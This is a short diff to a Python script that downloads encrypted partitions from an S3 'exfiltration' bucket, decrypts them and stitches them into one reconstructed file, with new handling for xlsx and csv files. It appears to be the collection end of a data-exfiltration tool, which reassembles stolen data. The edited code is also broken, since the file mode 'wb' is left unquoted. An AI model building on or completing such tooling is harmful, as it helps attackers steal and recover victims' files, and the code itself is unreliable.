@@ -73,8 +73,16 @@ for file in fileNames:
 	name = file.replace('exfiltrated_data/','')
 	aws_s3_resource.meta.client.download_file(exfiltration_bucket_name, file, 'downloadedFiles/'+name)
 
+#----------We check the correct extension-------------
+if "xlsx" in fileNames[0]:
+	reconstructed_file_name = 'reconstructedFile.xlsx'
+elif "csv" in fileNames[0]:
+	reconstructed_file_name = 'reconstructedFile.csv'
+else:
+	reconstructed_file_name = 'reconstructedFile.txt'
+
 #----------We create a reconstruction file--------------
-with open('reconstructedFile.txt', 'a+') as finalFile:
+with open(reconstructed_file_name, wb) as finalFile:
 	#---------- fileNames are partitionNames--------
 	for file in fileNames:
 
@@ -90,7 +98,7 @@ with open('reconstructedFile.txt', 'a+') as finalFile:
 		data_decrypt = f.decrypt(data_bytes)
 
 		#----------Info goes inside reconstructedFile--------------
-		finalFile.write(data_decrypt.decode().replace('\r',''))
+		finalFile.write(data_decrypt)
 
 		file.close()
 
